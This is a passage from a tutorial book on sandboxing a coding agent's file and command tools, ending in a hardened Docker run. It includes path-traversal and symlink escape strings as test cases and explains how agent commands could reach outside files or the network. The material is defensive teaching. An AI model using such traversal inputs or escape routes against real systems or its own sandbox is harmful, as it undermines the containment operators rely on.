+
+<h3 id="s02-08">If it goes wrong</h3>
+
+<ul>
+<li><strong>The demo blocks plain <code>../</code> and nothing else</strong> — that is correct for this</li>
+</ul>
+
+<p>  stage. The string check catches the obvious spelling.</p>
+
+<ul>
+<li><strong>The symlink case skips</strong> — Windows needs Developer Mode or an elevated</li>
+</ul>
+
+<p>  process to create symlinks. The prefix-sibling case still demonstrates the</p>
+
+<p>  class of bug.</p>
+
+<ul>
+<li><strong>A test fails because echo is missing</strong> — the demo uses the platform shell;</li>
+</ul>
+
+<p>  <code>echo</code> is available in both <code>cmd.exe</code> and POSIX shells. If your environment is</p>
+
+<p>  unusual, replace it with <code>python -c "print('hello')"</code> in <code>run_shell</code>.</p>
+
+<h3 id="s02-09">Read next</h3>
+
+<ul>
+<li><code>../plan.md</code> Stage 0</li>
+<li><code>../THREAT_MODEL.md</code> — the full list of assets and threats</li>
+<li><code>../ch01/CHAPTER.md</code> — one path policy for every tool</li>
+</ul>
+
+</section>
+
+<hr>
+
+<section id="s03">
+<h2><span class="num">03</span><span>Chapter 1 — Stage 1: One path policy</span></h2>
+
+<p><strong>Book:</strong> Stage 1, "One path policy"</p>
+
+<p><strong>Plan:</strong> Stage 1</p>
+
+<p><strong>Goal:</strong> Replace the string-prefix fence with one object that resolves real paths and answers the same question for every tool.</p>
+
+<h3 id="s03-01">The problem</h3>
+
+<p>The naive fence fails because it asks "does this path <em>look</em> like it is inside</p>
+
+<p>the workspace?" The kernel asks "which file will this path <em>open</em>?" Those are</p>
+
+<p>different questions, and only the second one matters.</p>
+
+<p>There are three layers to get right:</p>
+
+<ol>
+<li><strong>Lexical normalisation.</strong> Collapse <code>.</code> and <code>..</code>; reject NUL bytes, control</li>
+</ol>
+
+<p>   characters, UNC paths and drive-relative forms.</p>
+
+<ol>
+<li><strong>Symlink resolution.</strong> Follow every link in the longest existing prefix,</li>
+</ol>
+
+<p>   then reattach the part that does not exist yet.</p>
+
+<ol>
+<li><strong>Containment.</strong> Compare canonical paths with a real common-path check, not</li>
+</ol>
+
+<p>   <code>startswith</code>.</p>
+
+<p>Stage 1 puts all three in <code>mini_harness/path_policy.py</code>. It contains no</p>
+
+<p>file-content logic. It only answers where a path points.</p>
+
+<h3 id="s03-02">What changed</h3>
+
+<ul>
+<li>Added <code>mini_harness/path_policy.py</code> with <code>PathPolicy</code>, <code>PolicyError</code> and</li>
+</ul>
+
+<p>  <code>ResolvedPath</code>.</p>
+
+<ul>
+<li>Added <code>mini_harness/demo.py</code>, which exercises allowed and refused names.</li>
+<li>Added <code>tests/test_path_policy.py</code> with 25 cases covering the platform edges.</li>
+</ul>
+
+<h3 id="s03-03">The central algorithm</h3>
+
+<h4 id="s03-03-01">Resolve the deepest existing ancestor</h4>
+
+<p>A write target often does not exist yet:</p>
+
+<figure class="code"><pre>workspace/deep/new/file.txt</pre></figure>
+
+<p><code>os.path.realpath</code> only resolves what is on disk. If the whole path is missing,</p>
+
+<p>it cannot tell you that <code>workspace/link-to-outside</code> is a symlinked parent.</p>
+
+<p><code>_realpath_best</code> walks upward until it finds something that exists, resolves</p>
+
+<p>that prefix, then reattaches the missing components:</p>
+
+<figure class="code"><pre>current = Path(os.path.abspath(path))
+missing = []
+while not current.exists():
+    missing.append(current.name)
+    current = current.parent
+resolved = Path(os.path.realpath(current))
+for part in reversed(missing):
+    resolved = resolved / part</pre></figure>
+
+<p>This catches the important case:</p>
+
+<figure class="code"><pre>workspace/outside-link/new.txt
+                ^ symlink to /tmp/attacker</pre></figure>
+
+<p>The <code>new.txt</code> does not exist, but its parent does. Resolving the parent proves</p>
+
+<p>that the canonical target is outside the workspace.</p>
+
+<h4 id="s03-03-02">Compare real paths with <code>commonpath</code></h4>
+
+<figure class="code"><pre>root = os.path.normcase(str(self.real_root))
+target = os.path.normcase(str(real_target))
+common = os.path.commonpath([root, target])
+return common == root</pre></figure>
+
+<p><code>commonpath</code> understands path boundaries. On Windows it raises <code>ValueError</code> for</p>
+
+<p>paths on different drives; that is a refusal, not a crash. <code>normcase</code> lowercases</p>
+
+<p>on Windows so case-insensitive filesystems compare correctly.</p>
+
+<h4 id="s03-03-03">Reads and writes differ on purpose</h4>
+
+<p>Reads may be absolute as long as the resolved file is inside the root. A</p>
+
+<p>developer may want to read a file by its full path. Writes must be relative:</p>
+
+<p>a write should be an intentional workspace action, not an absolute overwrite of</p>
+
+<p>a system file.</p>
+
+<p>Writes also refuse a final symlink. The atomic writer in Stage 2 would replace</p>
+
+<p>the link rather than follow it, but other tools may not. Refusing at the policy</p>
+
+<p>layer makes the rule independent of the tool.</p>
+
+<h4 id="s03-03-04">Platform spellings are normalised before validation</h4>
+
+<p>The policy treats <code>\</code> as a separator on every platform. On POSIX, <code>..\secret</code></p>
+
+<p>would otherwise be a legal (but bizarre) filename. Normalising it makes the</p>
+
+<p>answer the same everywhere: that is traversal, and it is refused.</p>
+
+<p>The policy also rejects:</p>
+
+<ul>
+<li><code>C:foo</code> — drive-relative, not drive-absolute;</li>
+<li><code>\\server\share</code> — UNC;</li>
+<li><code>CON</code>, <code>NUL</code>, <code>LPT1.log</code> — Windows device names;</li>
+<li><code>file.txt:stream</code> — an NTFS alternate data stream (colon-bearing names are refused);</li>
+<li>trailing dots and spaces on Windows — the OS may strip them, so two different</li>
+</ul>
+
+<p>  strings can name the same file;</p>
+
+<ul>
+<li>control characters, especially NUL.</li>
+</ul>
+
+<h3 id="s03-04">Run it</h3>
+
+<p>From <code>ch01/</code>:</p>
+
+<figure class="code"><pre>python -m mini_harness.demo
+python -m pytest -v</pre></figure>
+
+<p>The demo prints the canonical path for allowed names and a <code>PATH:</code> refusal for</p>
+
+<p>the rest:</p>
+
+<figure class="code"><pre>[allowed] read notes.txt: notes.txt -&gt; ...\workspace\notes.txt
+[blocked] read ../outside.txt: PATH: path escapes workspace: ../outside.txt
+[blocked] read prefix sibling: PATH: path escapes workspace: ../workspace-evil/secret.txt</pre></figure>
+
+<h3 id="s03-05">It works when</h3>
+
+<ul>
+<li>[ ] A normal read resolves to a canonical path inside the root.</li>
+<li>[ ] <code>../outside.txt</code> is refused.</li>
+<li>[ ] <code>../workspace-evil/secret.txt</code> is refused (the Stage 0 bug).</li>
+<li>[ ] An absolute path inside the root is allowed for reads.</li>
+<li>[ ] An absolute path outside the root is refused.</li>
+<li>[ ] A write to an absolute path is refused.</li>
+<li>[ ] A write through a symlink is refused.</li>
+<li>[ ] <code>CON.txt</code>, <code>C:foo</code>, UNC and NUL-byte names are refused.</li>
+<li>[ ] The symlink tests skip, rather than fail, on a machine that cannot create</li>
+</ul>
+
+<p>      symlinks.</p>
+
+<h3 id="s03-06">Stage limits</h3>
+
+<ul>
+<li>The policy is not a jail. A Python process running as the same user can still</li>
+</ul>
+
+<p>  open files directly with <code>os.open</code>, race a check, or read <code>/proc</code>.</p>
+
+<ul>
+<li>The policy does not cap file sizes; Stage 2 adds that.</li>
+<li>The policy does not audit refusals; Stage 5 adds that.</li>
+<li><code>realpath</code> + <code>open</code> is still a time-of-check/time-of-use gap. The only full</li>
+</ul>
+
+<p>  answer is a separate security boundary (Stage 4).</p>
+
+<h3 id="s03-07">If it goes wrong</h3>
+
+<ul>
+<li><strong>A symlink test skips on Windows</strong> — enable Developer Mode or run elevated,</li>
+</ul>
+
+<p>  or accept the skip. The prefix-sibling and traversal tests still exercise the</p>
+
+<p>  containment logic.</p>
+
+<ul>
+<li><strong><code>resolve_read("C:/x")</code> behaves differently on POSIX</strong> — drive-absolute</li>
+</ul>
+
+<p>  paths are refused on non-Windows because they would be interpreted as a</p>
+
+<p>  relative name containing a colon. This is intentional.</p>
+
+<ul>
+<li><strong>A path with <code>..</code> gets a reserved-name error</strong> — make sure <code>.</code> and <code>..</code> are</li>
+</ul>
+
+<p>  skipped by the reserved-name check and handled by normalisation. The tests</p>
+
+<p>  cover this.</p>
+
+<ul>
+<li><strong>A write to a new nested path is refused</strong> — check that</li>
+</ul>
+
+<p>  <code>_realpath_best</code> reattaches the missing tail after resolving the parent.</p>
+
+<p>  Stage 2's <code>_ensure_parent</code> creates those folders.</p>
+
+<h3 id="s03-08">Read next</h3>
+
+<ul>
+<li><code>../plan.md</code> Stage 1</li>
+<li><code>../THREAT_MODEL.md</code> — path traversal and symlink threats</li>
+<li><code>../ch02/CHAPTER.md</code> — file tools with size limits and atomic writes</li>
+</ul>
+
+</section>
+
+<hr>
+
+<section id="s04">
+<h2><span class="num">04</span><span>Chapter 2 — Stage 2: The sandbox object and file tools</span></h2>
+
+<p><strong>Book:</strong> Stage 2, "The sandbox object and file tools"</p>
+
+<p><strong>Plan:</strong> Stage 2</p>
+
+<p><strong>Goal:</strong> Put every file operation behind one object with size limits, atomic writes and a stable error vocabulary.</p>
+
+<h3 id="s04-01">The problem</h3>
+
+<p>A path policy is necessary but not sufficient. Even a correctly resolved path</p>
+
+<p>can be used badly:</p>
+
+<ul>
+<li>reading a 2 GB file into the model's context;</li>
+<li>listing a directory with a million entries;</li>
+<li>writing a file in place, so a crash leaves half a file;</li>
+<li>following a symlink for a write that the policy only checked marginally;</li>
+<li>raising a Python exception that unwinds the agent loop.</li>
+</ul>
+
+<p>Stage 2 turns the policy into a <strong>sandbox contract</strong>. The policy still answers</p>
+
+<p>"where"; the sandbox answers "how much, how safely, and what does the caller</p>
+
+<p>see when it is refused?"</p>
+
+<h3 id="s04-02">What changed</h3>
+
+<ul>
+<li>Added <code>mini_harness/sandbox.py</code> with <code>Sandbox</code>, <code>Limits</code>, <code>DirEntry</code> and</li>
+</ul>
+
+<p>  <code>SandboxError</code>.</p>
+
+<ul>
+<li>Added <code>mini_harness/file_tools.py</code> with the model-facing tool contract and</li>
+</ul>
+
+<p>  <code>run_tool</code>.</p>
+
+<ul>
+<li>Added <code>mini_harness/demo.py</code> and <code>tests/test_sandbox.py</code>.</li>
+</ul>
+
+<h3 id="s04-03">The contract</h3>
+
+<h4 id="s04-03-01">Limits</h4>
+
+<figure class="code"><pre>@dataclass(frozen=True)
+class Limits:
+    max_read_bytes: int = 2 * 1024 * 1024
+    max_write_bytes: int = 1 * 1024 * 1024
+    max_dir_entries: int = 500
+    max_line_bytes: int = 4000</pre></figure>
+
+<p>These are policy choices, not security boundaries. They protect the **agent</p>
+
+<p>process** from a tool result that is too large to handle. A model can still ask</p>
+
+<p>for a small file many times; the loop's step limit and the operator's rate</p>
+
+<p>limits are the answer to that.</p>
+
+<h4 id="s04-03-02">Reads are byte-bounded</h4>
+
+<p><code>read_text</code> checks <code>stat().st_size</code> before opening. It then reads bytes and</p>
+
+<p>decodes UTF-8 with <code>errors="replace"</code>. Reading bytes:</p>
+
+<ul>
+<li>applies the limit to exactly the data received;</li>
+<li>avoids newline translation, so an edit round-trip preserves <code>\r\n</code>;</li>
+<li>avoids crashing on one stray non-UTF-8 byte.</li>
+</ul>
+
+<h4 id="s04-03-03">Writes are atomic</h4>
+
+<p>The writer creates a temporary file in the <strong>same directory</strong>, writes and</p>
+
+<p>flushes it, calls <code>os.fsync</code>, then <code>os.replace</code>s it over the target. A reader</p>
+
+<p>sees the old file or the new file, never a half-written one. The temporary file</p>
+
+<p>is removed on failure.</p>
+
+<p>The parent folders are created one component at a time, and the policy is</p>
+
+<p>re-run after each <code>mkdir</code>. That does not eliminate a determined race, but it</p>
+
+<p>catches a symlink planted between the first check and the write. The real fix</p>
+
+<p>for a hostile local user is the container in Stage 4.</p>
+
+<h4 id="s04-03-04">Edits are unique by default</h4>
+
+<p><code>edit_text(path, old, new)</code> refuses when <code>old</code> appears zero times or more than</p>
+
+<p>once. A silent <code>replace</code> of three identical snippets is a classic way for an</p>
+
+<p>agent to corrupt code. Passing <code>count=0</code> means "replace all" and is an explicit</p>
+
+<p>opt-in.</p>
+
+<h4 id="s04-03-05">Deletes are file-only</h4>
+
+<p><code>delete_file</code> refuses directories and non-regular files. Recursive delete is a</p>
+
+<p>much larger blast radius than one file, and an agent can always ask for files</p>
+
+<p>one at a time. A symlink is refused by the policy before this method sees it.</p>
+
+<h4 id="s04-03-06">Errors become observations</h4>
+
+<p>Tools return strings, not exceptions:</p>
+
+<figure class="code"><pre>OK: wrote 19 bytes to todo.md
+ERROR[PATH]: path escapes workspace: ../outside.txt
+ERROR[TOO_LARGE]: content is 2000 bytes; limit is 1024
+ERROR[IS_DIR]: refusing to delete a folder</pre></figure>
+
+<p><code>run_tool</code> catches <code>SandboxError</code>, <code>KeyError</code>-style argument mistakes and</p>
+
+<p>unexpected exceptions. A bug in a tool is labelled <code>INTERNAL</code> and does not kill</p>
+
+<p>the session. The traceback belongs in the server log, not in the model's</p>
+
+<p>context.</p>
+
+<h3 id="s04-04">Run it</h3>
+
+<p>From <code>ch02/</code>:</p>
+
+<figure class="code"><pre>python -m mini_harness.demo
+python -m pytest -v</pre></figure>
+
+<p>The demo performs normal work and then four refusals. The exact observation</p>
+
+<p>strings are what a model would see.</p>
+
+<h3 id="s04-05">It works when</h3>
+
+<ul>
+<li>[ ] <code>read_text</code> returns the file, preserves <code>\r\n</code>, and refuses a directory.</li>
+<li>[ ] A read over the limit returns <code>TOO_LARGE</code>.</li>
+<li>[ ] A write creates missing parent folders.</li>
+<li>[ ] A write leaves no <code>.sandbox-*.tmp</code> file behind.</li>
+<li>[ ] <code>overwrite=False</code> returns <code>EXISTS</code> instead of clobbering.</li>
+<li>[ ] An edit with missing or repeated old text returns <code>NO_MATCH</code> or</li>
+</ul>
+
+<p>      <code>AMBIGUOUS</code>.</p>
+
+<ul>
+<li>[ ] A delete of a folder returns <code>IS_DIR</code>.</li>
+<li>[ ] An escape returns <code>ERROR[PATH]</code>, not a traceback.</li>
+<li>[ ] The symlink-write test skips on a machine that cannot create symlinks.</li>
+</ul>
+
+<h3 id="s04-06">Stage limits</h3>
+
+<ul>
+<li>Still the same user on the same kernel. A command tool would be able to</li>
+</ul>
+
+<p>  bypass the sandbox entirely.</p>
+
+<ul>
+<li>Still a time-of-check/time-of-use gap between policy and open.</li>
+<li>No command execution yet.</li>
+<li>No audit trail yet.</li>
+</ul>
+
+<h3 id="s04-07">If it goes wrong</h3>
+
+<ul>
+<li><strong>An edit changes the wrong text</strong> — check that the unique-match default is</li>
+</ul>
+
+<p>  active and that <code>count=0</code> is only used deliberately.</p>
+
+<ul>
+<li><strong>A write succeeds but the file is empty</strong> — check that the temp file is</li>
+</ul>
+
+<p>  flushed and fsynced before <code>os.replace</code>, and that the bytes are written</p>
+
+<p>  before the handle closes.</p>
+
+<ul>
+<li><strong>A new nested path fails</strong> — <code>_ensure_parent</code> walks <code>relative_to(root)</code> and</li>
+</ul>
+
+<p>  creates each missing component. A parent that is a file returns <code>NOT_DIR</code>.</p>
+
+<ul>
+<li><strong>Windows says the temp file is in use</strong> — an open handle usually means the</li>
+</ul>
+
+<p>  writer raised before <code>os.replace</code>. The cleanup path removes it; check the</p>
+
+<p>  <code>IO</code> message for the underlying error.</p>
+
+<ul>
+<li><strong>A symlink read looks like a normal file</strong> — that is correct: reading</li>
+</ul>
+
+<p>  through a symlink is allowed when the resolved target is inside the root. A</p>
+
+<p>  write through a final symlink is refused.</p>
+
+<h3 id="s04-08">Read next</h3>
+
+<ul>
+<li><code>../plan.md</code> Stage 2</li>
+<li><code>../THREAT_MODEL.md</code> — resource exhaustion and file-write threats</li>
+<li><code>../ch03/CHAPTER.md</code> — command execution without a shell</li>
+</ul>
+
+</section>
+
+<hr>
+
+<section id="s05">
+<h2><span class="num">05</span><span>Chapter 3 — Stage 3: Running code locally</span></h2>
+
+<p><strong>Book:</strong> Stage 3, "Running code locally"</p>
+
+<p><strong>Plan:</strong> Stage 3</p>
+
+<p><strong>Goal:</strong> Execute a command through an argv allowlist with a clean environment, a timeout, a process-tree kill and bounded output.</p>
+
+<h3 id="s05-01">The problem</h3>
+
+<p>The moment a coding agent can run a command, the sandbox story changes. File</p>
+
+<p>tools are a small set of operations; a process is a general-purpose escape</p>
+
+<p>hatch. The first version of a command tool is usually:</p>
+
+<figure class="code"><pre>subprocess.run(user_string, shell=True)</pre></figure>
+
+<p>That single line gives the model:</p>
+
+<ul>
+<li>shell composition (<code>;</code>, <code>&amp;&amp;</code>, pipes, redirection);</li>
+<li>the parent environment, including API keys;</li>
+<li>unlimited run time;</li>
+<li>unlimited output;</li>
+<li>no CPU, memory, file-size or process limits;</li>
+<li>the same filesystem and network access as the agent process.</li>
+</ul>
+
+<p>Stage 3 removes the easy accidents. It does <strong>not</strong> claim to be a jail.</p>
+
+<h3 id="s05-02">What changed</h3>
+
+<ul>
+<li>Added <code>mini_harness/local_runner.py</code> with <code>CommandRunner</code>, <code>Limits</code>,</li>
+</ul>
+
+<p>  <code>CommandPolicy</code> and <code>CommandResult</code>.</p>
+
+<ul>
+<li>Added <code>mini_harness/command_tool.py</code> with the model-facing <code>run_command</code></li>
+</ul>
+
+<p>  observation shape.</p>
+
+<ul>
+<li>Added <code>mini_harness/demo.py</code> and <code>tests/test_local_runner.py</code>.</li>
+</ul>
+
+<h3 id="s05-03">The seven controls</h3>
+
+<h4 id="s05-03-01">1. Argv, not a string</h4>
+
+<p><code>CommandRunner.run("python", ["-c", "print('hi')"])</code> takes a program and a list</p>
+
+<p>of arguments. Passing a single string is rejected. There is no <code>shell=True</code></p>
+
+<p>path in the runner.</p>
+
+<p>A semicolon inside an argument is an ordinary character:</p>
+
+<figure class="code"><pre>python -c "print('a;b')"   -&gt;  a;b</pre></figure>
+
+<p>There is no second command to start.</p>
+
+<h4 id="s05-03-02">2. An absolute-path allowlist</h4>
+
+<p><code>CommandPolicy</code> maps a logical name to an absolute executable:</p>
+
+<figure class="code"><pre>{"python": sys.executable}</pre></figure>
+
+<p>The runner does not use <code>shutil.which</code> for model-supplied names. A file called</p>
+
+<p><code>python</code> dropped into the workspace cannot shadow the interpreter through</p>
+
+<p><code>PATH</code>. The allowlist is checked again at call time; a missing executable is an</p>
+
+<p><code>IO</code> error, not a fallback to <code>PATH</code>.</p>
+
+<h4 id="s05-03-03">3. A clean environment</h4>
+
+<p><code>_clean_environment</code> starts from an empty dict and adds only:</p>
+
+<ul>
+<li>OS-essential variables (<code>SYSTEMROOT</code>, <code>WINDIR</code>, <code>COMSPEC</code>, <code>PATHEXT</code>, <code>LANG</code>,</li>
+</ul>
+
+<p>  <code>LC_ALL</code>);</p>
+
+<ul>
+<li>a minimal <code>PATH</code>;</li>
+<li>workspace-local <code>HOME</code>, <code>TMP</code> and <code>TEMP</code>;</li>
+<li>deterministic Python flags.</li>
+</ul>
+
+<p>A sentinel secret in the parent environment does not appear in the child. The</p>
+
+<p>test asserts that directly.</p>
+
+<h4 id="s05-03-04">4. A timeout with a process-tree kill</h4>
+
+<p>The child is started in a new session (POSIX) or a new process group (Windows).</p>
+
+<p>On timeout the runner kills the <strong>group</strong>:</p>
+
+<ul>
+<li>POSIX: <code>os.killpg(os.getpgid(pid), SIGKILL)</code>;</li>
+<li>Windows: <code>taskkill /F /T /PID</code>.</li>
+</ul>
+
+<p>Killing only the direct child would leave grandchildren running.</p>
+
+<h4 id="s05-03-05">5. Output caps that still drain</h4>
+
+<p>Two background threads read stdout and stderr in 8 KiB chunks. Once the cap is</p>
+
+<p>reached the bytes are discarded but the pipe keeps being read. If the parent</p>
+
+<p>stopped reading, the child would block on a full pipe and never exit, turning</p>
+
+<p>an output limit into a hang.</p>
+
+<p>The observation always says when output was truncated.</p>
+
+<h4 id="s05-03-06">6. POSIX resource limits</h4>
+
+<p>Before <code>exec</code>, the child lowers:</p>
+
+<ul>
+<li><code>RLIMIT_CPU</code> — CPU seconds;</li>
+<li><code>RLIMIT_AS</code> — address space;</li>
+<li><code>RLIMIT_FSIZE</code> — maximum file size;</li>
+<li><code>RLIMIT_NOFILE</code> — open file descriptors;</li>
+<li><code>RLIMIT_NPROC</code> — process count (where supported).</li>
+</ul>
+
+<p>Failures are swallowed: an unsupported limit should not stop a legitimate</p>
+
+<p>command. On Windows there is no Python-level equivalent here; the book uses</p>
+
+<p>container limits in Stage 4 instead. Do not pretend the local runner is</p>
+
+<p>equivalent on both platforms.</p>
+
+<h4 id="s05-03-07">7. A workspace-relative working directory</h4>
+
+<p><code>cwd</code> goes through the same path policy as reads. The model cannot ask to run</p>
+
+<p>from the user's home folder. A missing or non-directory cwd is a <code>CWD</code> refusal.</p>
+
+<h3 id="s05-04">What the demo proves, honestly</h3>
+
+<p>The final demo command reads a file <strong>outside</strong> the workspace:</p>
+
+<figure class="code"><pre>local runner is not a filesystem jail
+  OK ... outside data</pre></figure>
+
+<p>That is not a bug in Stage 3. It is the motivation for Stage 4. Hygiene is not</p>
+
+<p>a boundary.</p>
+
+<h3 id="s05-05">Run it</h3>
+
+<p>From <code>ch03/</code>:</p>
+
+<figure class="code"><pre>python -m mini_harness.demo
+python -m pytest -v</pre></figure>
+
+<p>The tests use the running Python interpreter as the only allowlisted program,</p>
+
+<p>so they need no network and no shell. pytest is the sole test dependency.</p>
+
+<h3 id="s05-06">It works when</h3>
+
+<ul>
+<li>[ ] A normal Python command returns stdout and exit code 0.</li>
+<li>[ ] stderr is captured separately.</li>
+<li>[ ] A non-zero exit is visible in the result.</li>
+<li>[ ] A string instead of a list returns <code>ARGS</code>.</li>
+<li>[ ] A non-allowlisted program returns <code>DENIED</code>.</li>
+<li>[ ] A sentinel parent-environment secret is <code>MISSING</code> in the child.</li>
+<li>[ ] A sleeping child is killed at the timeout, and the run returns quickly.</li>
+<li>[ ] A 5000-byte line is truncated to the configured cap.</li>
+<li>[ ] <code>cwd="../.."</code> returns <code>CWD</code>.</li>
+<li>[ ] On POSIX, the child sees the requested <code>RLIMIT_CPU</code> (test may skip on</li>
+</ul>
+
+<p>      Windows).</p>
+
+<h3 id="s05-07">Stage limits</h3>
+
+<ul>
+<li>Same user, same filesystem, same network. The child can read anything the</li>
+</ul>
+
+<p>  user can read and connect to anything the user can connect to.</p>
+
+<ul>
+<li><code>preexec_fn</code> is used for rlimits. It is only safe here because the runner</li>
+</ul>
+
+<p>  executes one command at a time and starts no threads before <code>fork</code>. A</p>
+
+<p>  concurrent server should use <code>posix_spawn</code> or a supervisor.</p>
+
+<ul>
+<li>The allowlist applies to the <strong>direct</strong> program. That program can spawn</li>
+</ul>
+
+<p>  helpers. The container is what limits that.</p>
+
+<ul>
+<li>Windows has no rlimits in this chapter. The Docker chapter is the portable</li>
+</ul>
+
+<p>  boundary.</p>
+
+<h3 id="s05-08">If it goes wrong</h3>
+
+<ul>
+<li><strong><code>DENIED</code> for a program that exists</strong> — add its absolute path to the</li>
+</ul>
+
+<p>  <code>CommandPolicy</code> mapping. Do not switch to <code>shutil.which</code> for model input.</p>
+
+<ul>
+<li><strong>The timeout takes longer than expected on Windows</strong> — <code>taskkill /T</code> walks</li>
+</ul>
+
+<p>  the process tree and can take a moment. The test uses a generous bound.</p>
+
+<ul>
+<li><strong>Output is empty after a timeout</strong> — the child may have buffered its output.</li>
+</ul>
+
+<p>  Use <code>flush=True</code> in the test program, or accept that partial output is not</p>
+
+<p>  guaranteed.</p>
+
+<ul>
+<li><strong><code>RLIMIT_AS</code> breaks a legitimate Python start</strong> — the memory cap is applied</li>
+</ul>
+
+<p>  to the interpreter too. Raise <code>memory_mb</code> deliberately and record why.</p>
+
+<ul>
+<li><strong><code>preexec_fn</code> warnings</strong> — do not call this runner from multiple threads in a</li>
+</ul>
+
+<p>  larger application without redesigning child setup.</p>
+
+<h3 id="s05-09">Read next</h3>
+
+<ul>
+<li><code>../plan.md</code> Stage 3</li>
+<li><code>../THREAT_MODEL.md</code> — command execution and resource exhaustion</li>
+<li><code>../ch04/CHAPTER.md</code> — Docker as the real boundary</li>
+</ul>
+
+</section>
+
+<hr>
+
+<section id="s06">
+<h2><span class="num">06</span><span>Chapter 4 — Stage 4: Docker as the real wall</span></h2>
+
+<p><strong>Book:</strong> Stage 4, "Docker as the real wall"</p>
+
+<p><strong>Plan:</strong> Stage 4</p>
+
+<p><strong>Goal:</strong> Run one argv command inside a no-network, no-capability, resource-limited container with a read-only root and a single workspace bind mount.</p>
+
+<h3 id="s06-01">The problem</h3>
+
+<p>Stage 3 is good hygiene, not a boundary. The local runner and the agent run as</p>
+
+<p>the same user on the same kernel. A command can read the user's SSH keys, write</p>
+
+<p>to the user's home folder, or open a network connection. Timeouts and rlimits</p>
+
+<p>limit how much damage happens; they do not decide <strong>what</strong> is reachable.</p>
+
+<p>Docker adds a kernel-backed boundary: namespaces, cgroups, capabilities, a</p>
+
+<p>seccomp profile and a separate filesystem view. It is still not magic — a</p>
+
+<p>container shares the host kernel — but it is a much better default than "same</p>
+
+<p>process, same user, same filesystem".</p>
+
+<h3 id="s06-02">What changed</h3>
+
+<ul>
+<li>Added <code>docker/Dockerfile</code> and <code>docker/.dockerignore</code>.</li>
+<li>Added <code>mini_harness/docker_runner.py</code> with <code>DockerRunner</code>, <code>DockerConfig</code> and</li>
+</ul>
+
+<p>  <code>RunResult</code>.</p>
+
+<ul>
+<li>Added <code>mini_harness/demo.py</code> and <code>tests/test_docker_runner.py</code>.</li>
+<li>The tests assert the <strong>exact</strong> <code>docker run</code> flags without needing a daemon.</li>
+</ul>
+
+<h3 id="s06-03">The image contract</h3>
+
+<figure class="code"><pre>FROM python:3.12-slim-bookworm
+RUN groupadd --gid 1000 sandbox \
+    &amp;&amp; useradd --uid 1000 --gid sandbox --create-home \
+       --shell /usr/sbin/nologin sandbox \
+    &amp;&amp; mkdir -p /workspace \
+    &amp;&amp; chown sandbox:sandbox /workspace
+ENV PYTHONUNBUFFERED=1 \
+    PYTHONDONTWRITEBYTECODE=1 \
+    PYTHONNOUSERSITE=1 \
+    PYTHONIOENCODING=utf-8
+WORKDIR /workspace
+USER sandbox
+CMD ["python", "-c", "print('mini-harness sandbox image ready')"]</pre></figure>
+
+<p>The image does one job: run Python tools. It does not install a browser, a</p>
+
+<p>compiler stack or a package manager workflow at runtime. Fewer tools mean fewer</p>
+
+<p>ways out. The fixed <code>uid:gid</code> is what <code>--user</code> passes.</p>
+
+<p>Build from <code>ch04/</code>:</p>
+
+<figure class="code"><pre>docker build -t mini-harness-python:latest docker</pre></figure>
+
+<p>Pin the base image by digest in a real deployment. "latest" is convenient for a</p>
+
+<p>book and dangerous for production.</p>
+
+<h3 id="s06-04">The run contract</h3>
+
+<p>Every flag below is a deliberate decision. The tests fail if one disappears.</p>
+
+<div class="table-wrap"><table>
+<tr><th>Flag</th><th>Why it is there</th></tr>
+<tr><td><code>--rm</code></td><td>Remove the container when it exits.</td></tr>
+<tr><td><code>--name &lt;unique&gt;</code></td><td>Gives the timeout cleanup a reliable handle.</td></tr>
+<tr><td><code>--network none</code></td><td>No network namespace connectivity. A command cannot exfiltrate data or fetch a payload.</td></tr>
+<tr><td><code>--read-only</code></td><td>The container root filesystem is immutable.</td></tr>
+<tr><td><code>--cap-drop ALL</code></td><td>Drop every Linux capability; no raw sockets, no mounts, no <code>chown</code> tricks.</td></tr>
+<tr><td><code>--security-opt no-new-privileges</code></td><td>A setuid binary inside the image cannot gain privileges.</td></tr>
+<tr><td><code>--pids-limit 64</code></td><td>Bounds process creation (fork bombs).</td></tr>
+<tr><td><code>--memory 256m</code> / <code>--memory-swap 256m</code></td><td>Bounds memory and prevents swap from hiding the limit.</td></tr>
+<tr><td><code>--cpus 1.0</code></td><td>Bounds CPU time per unit of wall clock.</td></tr>
+<tr><td><code>--ulimit nofile=64:64</code></td><td>Bounds open file descriptors.</td></tr>
+<tr><td><code>--user 1000:1000</code></td><td>Non-root inside the container.</td></tr>
+<tr><td><code>--workdir /workspace</code></td><td>The only bind mount is the working directory.</td></tr>
+<tr><td><code>--tmpfs /tmp:...</code></td><td>A small writable scratch space, <code>noexec</code>, <code>nosuid</code>, size-limited.</td></tr>
+<tr><td><code>--tmpfs /run:...</code></td><td>Some tools expect <code>/run</code>; keep it small and ephemeral.</td></tr>
+<tr><td><code>--volume &lt;workspace&gt;:/workspace:rw</code></td><td>The only host path visible. Change to <code>:ro</code> for read-only tasks.</td></tr>
+<tr><td><code>--env ...</code></td><td>Explicit, minimal environment; the host environment is not passed through.</td></tr>
+<tr><td><code>--ipc none</code></td><td>No shared IPC namespace.</td></tr>
+<tr><td><code>--stop-timeout 2</code></td><td>Docker gets two seconds to stop the container before killing it.</td></tr>
+<tr><td><code>--init</code></td><td>A tiny init reaps orphaned grandchildren inside the container.</td></tr>
+</table></div>
+
+<p>Docker's default seccomp profile still applies. The runner does not pass</p>
+
+<p><code>--privileged</code>, does not mount the Docker socket, and does not add devices.</p>
+
+<h3 id="s06-05">The important subtlety: read-only root is not read-only workspace</h3>
+
+<p><code>--read-only</code> freezes the <strong>image</strong> filesystem. The bind mount at <code>/workspace</code></p>
+
+<p>is still writable when <code>workspace_mode="rw"</code>. That is intentional: a coding</p>
+
+<p>agent must edit files. The boundary is "only this folder is writable", not</p>
+
+<p>"nothing is writable".</p>
+
+<p>If a task only needs to read, use:</p>
+
+<figure class="code"><pre>DockerConfig(workspace_mode="ro")</pre></figure>
+
+<p>Then even the workspace is immutable inside the container, and the host file</p>
+
+<p>tools remain the only way to change it.</p>
+
+<h3 id="s06-06">Timeout cleanup</h3>
+
+<p><code>docker run --rm</code> removes the container when it exits. If the command hangs,</p>
+
+<p>the Python runner must <strong>also</strong> remove the container, because killing the</p>
+
+<p><code>docker</code> CLI process does not necessarily stop the daemon-side container. The</p>
+
+<p>runner calls:</p>
+
+<figure class="code"><pre>docker rm -f &lt;container-name&gt;</pre></figure>
+
+<p>then kills the CLI process. The unique name makes this safe.</p>
+
+<h3 id="s06-07">Run it</h3>
+
+<p>From <code>ch04/</code>:</p>
+
+<figure class="code"><pre>python -m mini_harness.demo
+python -m mini_harness.demo --build
+python -m pytest -v</pre></figure>
